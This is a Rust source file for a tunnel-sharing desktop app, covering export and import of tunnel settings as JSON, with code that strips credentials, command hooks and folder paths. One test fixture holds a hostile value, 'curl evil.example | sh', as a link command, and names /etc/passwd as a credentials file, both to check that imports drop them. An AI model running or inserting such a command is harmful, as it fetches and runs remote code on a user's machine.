//! Exporting saved tunnels to a JSON file and importing them again, plus the helpers that
//! build a new `TunnelConfig` from outside input (imports, links and the command line).

use std::{
    collections::HashSet,
    fs,
    path::PathBuf,
    time::{SystemTime, UNIX_EPOCH},
};

use serde::Serialize;
use serde_json::{json, Value};
use tauri::{AppHandle, Manager, State};
use tauri_plugin_dialog::{DialogExt, FileDialogBuilder, FilePath};

use crate::{background, settings::TunnelConfig, tunnel, tunnel::TunnelView, AppState};

/// Marks a file as a Cloudfairy tunnel export.
const FORMAT: &str = "cloudfairy-tunnels";
/// The export layout. Raise it when older versions can't read new files correctly.
const VERSION: u64 = 1;
/// Real exports are a few KB. Anything much larger isn't one.
const MAX_FILE_BYTES: u64 = 1024 * 1024;
const MAX_TUNNELS: usize = 1000;
pub const MAX_NAME_CHARS: usize = 100;

/// Fields whose names contain these words hold credentials. They stay out of exports and
/// are dropped from imports.
const SECRET_WORDS: [&str; 3] = ["password", "secret", "token"];

fn is_secret_key(key: &str) -> bool {
    let key = key.to_ascii_lowercase();
    SECRET_WORDS.iter().any(|w| key.contains(w))
}

fn strip_secrets(value: &mut Value) {
    match value {
        Value::Object(map) => {
            map.retain(|k, _| !is_secret_key(k));
            map.values_mut().for_each(strip_secrets);
        }
        Value::Array(items) => items.iter_mut().for_each(strip_secrets),
        _ => {}
    }
}

/// The name a tunnel gets when none is given: its target without the scheme.
pub fn default_name(target: &str) -> String {
    target
        .split_once("://")
        .map_or(target, |(_, rest)| rest)
        .to_string()
}

/// Trims a tunnel name from outside input. Empty means "use the default name".
pub fn clean_name(raw: &str) -> Result<Option<String>, String> {
    let name = raw.trim();
    if name.chars().count() > MAX_NAME_CHARS {
        return Err(format!("The name is longer than {MAX_NAME_CHARS} characters."));
    }
    if name.chars().any(char::is_control) {
        return Err("The name can't contain line breaks or control characters.".into());
    }
    Ok((!name.is_empty()).then(|| name.to_string()))
}

/// A tunnel id in the same style as `add_tunnel`'s that isn't in `taken`.
pub fn new_id(taken: &HashSet<String>) -> String {
    let mut n = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or_default();
    loop {
        let id = format!("t{n:x}");
        if !taken.contains(&id) {
            return id;
        }
        n += 1;
    }
}

/// Builds a tunnel from a normalized target. Every other field gets its default, so fields
/// added to `TunnelConfig` later need no change here.
pub fn new_config(id: String, target: &str, name: Option<String>) -> Result<TunnelConfig, String> {
    let name = name.unwrap_or_else(|| default_name(target));
    serde_json::from_value(json!({ "id": id, "name": name, "target": target }))
        .map_err(|e| e.to_string())
}

/// Removes fields that a shared file shouldn't be able to set, or that only make sense on
/// this computer:
/// - the link hooks, which could plant a command that runs when the tunnel goes live
/// - a shared folder's path, which could point at a home or system folder and make it public
///   the moment someone presses Start; an imported folder tunnel asks for its folder in Edit
/// - the CORS switch and extra response headers, which change what the user's app sends
/// - a named tunnel's account ids and credentials path (the hostname stays)
fn strip_machine_fields(map: &mut serde_json::Map<String, Value>) {
    for key in ["folder", "cors", "extraHeaders"] {
        map.remove(key);
    }
    if let Some(Value::Object(lifecycle)) = map.get_mut("lifecycle") {
        for key in ["urlFile", "urlFileVar", "urlCommand"] {
            lifecycle.remove(key);
        }
    }
    if let Some(Value::Object(named)) = map.get_mut("named") {
        named.retain(|key, _| key == "hostname");
    }
}

/// The last part of a folder path, for naming an imported folder tunnel.
fn folder_name(path: &str) -> String {
    let trimmed = path.trim_end_matches(['/', '\\']);
    let last = trimmed.rsplit(['/', '\\']).next().unwrap_or(trimmed);
    clean_name(last).ok().flatten().unwrap_or_else(|| "Folder".into())
}

/// The export file for `tunnels`: no ids, no field that looks like a credential, and none
/// of the fields `strip_machine_fields` removes.
pub fn export_json(tunnels: &[TunnelConfig]) -> Result<String, String> {
    let mut list = Vec::with_capacity(tunnels.len());
    for t in tunnels {
        let mut value = serde_json::to_value(t).map_err(|e| e.to_string())?;
        if let Value::Object(map) = &mut value {
            map.remove("id");
            strip_machine_fields(map);
        }
        strip_secrets(&mut value);
        list.push(value);
    }
    let file = json!({ "format": FORMAT, "version": VERSION, "tunnels": list });
    serde_json::to_string_pretty(&file).map_err(|e| e.to_string())
}

const NOT_AN_EXPORT: &str = "This file isn't a Cloudfairy tunnel export.";

/// Reads an export file. If any tunnel in it is invalid, nothing is imported. The returned
/// tunnels have empty ids; `merge` gives them new ones.
pub fn parse_import(text: &str) -> Result<Vec<TunnelConfig>, String> {
    let text = text.strip_prefix('\u{feff}').unwrap_or(text);
    let Ok(Value::Object(mut root)) = serde_json::from_str::<Value>(text) else {
        return Err(NOT_AN_EXPORT.into());
    };
    if root.get("format").and_then(Value::as_str) != Some(FORMAT) {
        return Err(NOT_AN_EXPORT.into());
    }
    match root.get("version").and_then(Value::as_u64) {
        Some(VERSION) => {}
        Some(v) if v > VERSION => {
            return Err("This file comes from a newer version of Cloudfairy. Update Cloudfairy to import it.".into())
        }
        _ => return Err("This export file has no valid version number.".into()),
    }
    let Some(Value::Array(items)) = root.remove("tunnels") else {
        return Err("This export file has no list of tunnels.".into());
    };
    if items.len() > MAX_TUNNELS {
        return Err(format!("This file has more than {MAX_TUNNELS} tunnels."));
    }
    items
        .into_iter()
        .enumerate()
        .map(|(i, item)| parse_entry(item).map_err(|e| format!("Tunnel {} in the file: {e}", i + 1)))
        .collect()
}

fn parse_entry(item: Value) -> Result<TunnelConfig, String> {
    let Value::Object(mut map) = item else {
        return Err("It isn't a tunnel entry.".into());
    };
    let is_folder = map.get("kind").and_then(Value::as_str) == Some("folder");
    let target = if is_folder {
        String::new()
    } else {
        match map.get("target") {
            Some(Value::String(s)) => tunnel::normalize_target(s)?,
            _ => return Err("The local address is missing.".into()),
        }
    };
    // Name a folder tunnel after its folder before the path is dropped.
    let folder_fallback = map.get("folder").and_then(Value::as_str).map(folder_name);
    strip_machine_fields(&mut map);
    let name = match map.get("name") {
        None | Some(Value::Null) => None,
        Some(Value::String(s)) => clean_name(s)?,
        Some(_) => return Err("The name must be text.".into()),
    };
    map.insert("id".into(), Value::String(String::new()));
    let fallback = if is_folder {
        folder_fallback.unwrap_or_else(|| "Folder".into())
    } else {
        default_name(&target)
    };
    map.insert("name".into(), Value::String(name.unwrap_or(fallback)));
    map.insert("target".into(), Value::String(target));
    // Anyone can send an export file, so imported tunnels never start by themselves.
    map.insert("startOnOpen".into(), Value::Bool(false));
    let mut value = Value::Object(map);
    strip_secrets(&mut value);
    serde_json::from_value(value).map_err(|e| format!("A setting has the wrong type ({e})."))
}

/// What makes two tunnels the same for import: the name plus the address, or the folder
/// for folder tunnels (whose saved address is empty).
fn dedupe_key(t: &TunnelConfig) -> (String, String) {
    let place = t.folder.clone().filter(|_| t.target.is_empty()).unwrap_or_else(|| t.target.clone());
    (t.name.clone(), place)
}

/// Adds `incoming` to `saved` with new ids. Skips any tunnel with the same name and target
/// as one already saved, or one earlier in the file. Returns the added tunnels and the
/// number skipped.
pub fn merge(saved: &mut Vec<TunnelConfig>, incoming: Vec<TunnelConfig>) -> (Vec<TunnelConfig>, usize) {
    let mut seen: HashSet<(String, String)> = saved
        .iter()
        .map(dedupe_key)
        .collect();
    let mut ids: HashSet<String> = saved.iter().map(|t| t.id.clone()).collect();
    let mut added = Vec::new();
    let mut skipped = 0;
    for mut t in incoming {
        if !seen.insert(dedupe_key(&t)) {
            skipped += 1;
            continue;
        }
        t.id = new_id(&ids);
        ids.insert(t.id.clone());
        saved.push(t.clone());
        added.push(t);
    }
    (added, skipped)
}

enum Pick {
    Open,
    Save,
}

/// Shows a native file dialog over the main window. `None` means the user canceled.
async fn pick_path(app: &AppHandle, mut dialog: FileDialogBuilder<tauri::Wry>, pick: Pick) -> Result<Option<PathBuf>, String> {
    if let Some(window) = app.get_webview_window("main") {
        dialog = dialog.set_parent(&window);
    }
    let (tx, rx) = tokio::sync::oneshot::channel::<Option<FilePath>>();
    let send = move |path| {
        let _ = tx.send(path);
    };
    match pick {
        Pick::Open => dialog.pick_file(send),
        Pick::Save => dialog.save_file(send),
    }
    let path = rx.await.map_err(|_| "The file dialog closed unexpectedly.".to_string())?;
    path.map(|p| p.into_path().map_err(|e| e.to_string())).transpose()
}

/// Saves the tunnels to a file the user picks. Returns how many were exported, or `None`
/// if the user canceled.
#[tauri::command]
pub async fn export_tunnels(app: AppHandle, state: State<'_, AppState>) -> Result<Option<usize>, String> {
    let tunnels = state.settings.get().tunnels;
    if tunnels.is_empty() {
        return Err("There are no tunnels to export.".into());
    }
    let json = export_json(&tunnels)?;
    let dialog = app
        .dialog()
        .file()
        .set_title("Export tunnels. Passwords and link commands aren't exported.")
        .set_file_name("cloudfairy-tunnels.json")
        .add_filter("Cloudfairy tunnels", &["json"]);
    let Some(path) = pick_path(&app, dialog, Pick::Save).await? else {
        return Ok(None);
    };
    fs::write(&path, json).map_err(|e| format!("Couldn't save the file: {e}"))?;
    Ok(Some(tunnels.len()))
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ImportResult {
    imported: usize,
    skipped: usize,
    tunnels: Vec<TunnelView>,
}

/// Adds the tunnels from a file the user picks. None of them start. Returns `None` if the
/// user canceled.
#[tauri::command]
pub async fn import_tunnels(app: AppHandle, state: State<'_, AppState>) -> Result<Option<ImportResult>, String> {
    let dialog = app
        .dialog()
        .file()
        .set_title("Import tunnels")
        .add_filter("Cloudfairy tunnels", &["json"]);
    let Some(path) = pick_path(&app, dialog, Pick::Open).await? else {
        return Ok(None);
    };
    let size = fs::metadata(&path)
        .map_err(|e| format!("Couldn't read the file: {e}"))?
        .len();
    if size > MAX_FILE_BYTES {
        return Err(NOT_AN_EXPORT.into());
    }
    let text = fs::read_to_string(&path).map_err(|e| format!("Couldn't read the file: {e}"))?;
    let incoming = parse_import(&text)?;
    let (added, skipped) = state.settings.update(|s| merge(&mut s.tunnels, incoming))?;
    background::refresh_tray(&app);
    Ok(Some(ImportResult {
        imported: added.len(),
        skipped,
        tunnels: added.into_iter().map(|c| state.tunnels.view(c)).collect(),
    }))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn saved(id: &str, name: &str, target: &str) -> TunnelConfig {
        new_config(id.into(), target, Some(name.into())).unwrap()
    }

    fn file(tunnels: Value) -> String {
        json!({ "format": FORMAT, "version": VERSION, "tunnels": tunnels }).to_string()
    }

    #[test]
    fn export_leaves_out_ids_and_secrets() {
        let mut t = saved("t1", "Shop", "http://localhost:3000");
        t.start_on_open = true;
        let text = export_json(&[t]).unwrap();
        let v: Value = serde_json::from_str(&text).unwrap();
        assert_eq!(v["format"], FORMAT);
        assert_eq!(v["version"], VERSION);
        let entry = &v["tunnels"][0];
        assert!(entry.get("id").is_none());
        assert_eq!(entry["name"], "Shop");
        assert_eq!(entry["target"], "http://localhost:3000");
        assert_eq!(entry["startOnOpen"], true);

        let mut v = json!({ "name": "A", "basicAuthPassword": "x", "apiToken": "y",
            "clientSecret": "z", "auth": { "PASSWORD": "p", "user": "u" } });
        strip_secrets(&mut v);
        assert_eq!(v, json!({ "name": "A", "auth": { "user": "u" } }));
    }

    #[test]
    fn export_round_trips() {
        let tunnels = vec![
            saved("t1", "Shop", "http://localhost:3000"),
            saved("t2", "API", "https://localhost:8443/api"),
        ];
        let parsed = parse_import(&export_json(&tunnels).unwrap()).unwrap();
        assert_eq!(parsed.len(), 2);
        assert_eq!(parsed[1].name, "API");
        assert_eq!(parsed[1].target, "https://localhost:8443/api");
    }

    #[test]
    fn import_normalizes_and_never_auto_starts() {
        let text = file(json!([
            { "id": "old", "name": "  Shop ", "target": "3000", "startOnOpen": true,
              "rewriteHost": true, "password": "hunter2", "someFutureField": 1 },
            { "target": "localhost:5173/" },
        ]));
        let parsed = parse_import(&text).unwrap();
        assert_eq!(parsed[0].id, "");
        assert_eq!(parsed[0].name, "Shop");
        assert_eq!(parsed[0].target, "http://localhost:3000");
        assert!(parsed[0].rewrite_host);
        assert!(!parsed[0].start_on_open);
        assert_eq!(parsed[1].name, "localhost:5173");
        assert_eq!(parsed[1].target, "http://localhost:5173");
        // Exports start with a byte order mark when edited in some Windows editors.
        assert!(parse_import(&format!("\u{feff}{text}")).is_ok());
    }

    #[test]
    fn import_drops_hooks_and_named_tunnel_ids() {
        let text = file(json!([{ "name": "Shop", "target": "3000",
            "lifecycle": { "restartOnFailure": true, "stopAfterMinutes": 30,
                "urlFile": "/tmp/x", "urlFileVar": "URL", "urlCommand": "curl evil.example | sh" },
            "named": { "hostname": "app.example.com", "tunnelId": "u", "tunnelName": "n",
                "credentialsFile": "/etc/passwd", "routedHostname": "app.example.com" } }]));
        let t = &parse_import(&text).unwrap()[0];
        assert!(t.lifecycle.restart_on_failure && t.lifecycle.stop_after_minutes == 30);
        assert!(t.lifecycle.url_command.is_empty() && t.lifecycle.url_file.is_empty());
        let named = serde_json::to_value(t.named.as_ref().unwrap()).unwrap();
        assert_eq!(named["hostname"], "app.example.com");
        assert!(named.get("credentialsFile").map_or(true, Value::is_null));
        assert!(named.get("tunnelId").map_or(true, Value::is_null));
        // Export leaves them out too.
        let out: Value = serde_json::from_str(&export_json(std::slice::from_ref(t)).unwrap()).unwrap();
        assert!(out["tunnels"][0]["lifecycle"].get("urlCommand").is_none());
    }

    #[test]
    fn imports_leave_out_folder_paths_and_header_settings() {
        let text = file(json!([
            { "kind": "folder", "folder": if cfg!(windows) { r"C:\Users\me" } else { "/home/me" }, "target": "" },
            { "kind": "folder", "name": "Docs" },
            { "target": "3000", "cors": true, "extraHeaders": [{ "name": "X-A", "value": "1" }] },
        ]));
        let parsed = parse_import(&text).unwrap();
        assert_eq!(parsed[0].name, "me", "named after the folder it had");
        assert!(parsed[0].folder.is_none(), "the path never comes in from a file");
        assert_eq!(parsed[0].target, "");
        assert_eq!(parsed[1].name, "Docs");
        assert!(!parsed[2].cors && parsed[2].extra_headers.is_empty());
        let out: Value = serde_json::from_str(&export_json(&parsed).unwrap()).unwrap();
        assert!(out["tunnels"][2].get("cors").is_none());
    }

    #[test]
    fn import_rejects_bad_files() {
        let err = |text: &str| parse_import(text).unwrap_err();
        assert_eq!(err("not json"), NOT_AN_EXPORT);
        assert_eq!(err("[]"), NOT_AN_EXPORT);
        assert_eq!(err(r#"{"version":1,"tunnels":[]}"#), NOT_AN_EXPORT);
        assert!(err(r#"{"format":"cloudfairy-tunnels","tunnels":[]}"#).contains("version"));
        assert!(err(r#"{"format":"cloudfairy-tunnels","version":"1","tunnels":[]}"#).contains("version"));
        assert!(err(r#"{"format":"cloudfairy-tunnels","version":2,"tunnels":[]}"#).contains("newer"));
        assert!(err(r#"{"format":"cloudfairy-tunnels","version":1}"#).contains("list"));
        assert!(err(r#"{"format":"cloudfairy-tunnels","version":1,"tunnels":{}}"#).contains("list"));

        let many: Vec<Value> = (0..=MAX_TUNNELS).map(|_| json!({ "target": "3000" })).collect();
        assert!(err(&file(Value::Array(many))).contains("more than"));

        // One bad entry rejects the whole file and says which one.
        let bad = |entry: Value| err(&file(json!([{ "target": "3000" }, entry])));
        assert!(bad(json!("3000")).starts_with("Tunnel 2 in the file"));
        assert!(bad(json!({ "name": "No target" })).contains("local address"));
        assert!(bad(json!({ "target": 3000 })).contains("local address"));
        assert!(bad(json!({ "target": "70000" })).contains("1 to 65535"));
        assert!(bad(json!({ "target": "ftp://localhost" })).contains("http://"));
        assert!(bad(json!({ "target": "3000", "name": 5 })).contains("text"));
        assert!(bad(json!({ "target": "3000", "name": "a\nb" })).contains("control"));
        assert!(bad(json!({ "target": "3000", "name": "x".repeat(MAX_NAME_CHARS + 1) })).contains("longer"));
        assert!(bad(json!({ "target": "3000", "rewriteHost": "yes" })).contains("wrong type"));
    }

    #[test]
    fn merge_skips_duplicates_and_assigns_new_ids() {
        let mut list = vec![saved("t1", "Shop", "http://localhost:3000")];
        let incoming = vec![
            saved("", "Shop", "http://localhost:3000"),  // same as saved
            saved("", "Shop 2", "http://localhost:3000"), // same target, new name
            saved("", "API", "http://localhost:8000"),
            saved("", "API", "http://localhost:8000"),    // repeated in the file
        ];
        let (added, skipped) = merge(&mut list, incoming);
        assert_eq!(skipped, 2);
        assert_eq!(added.len(), 2);
        assert_eq!(list.len(), 3);
        let ids: HashSet<&str> = list.iter().map(|t| t.id.as_str()).collect();
        assert_eq!(ids.len(), 3);
        assert!(added.iter().all(|t| !t.id.is_empty() && t.id.starts_with('t')));
    }
}
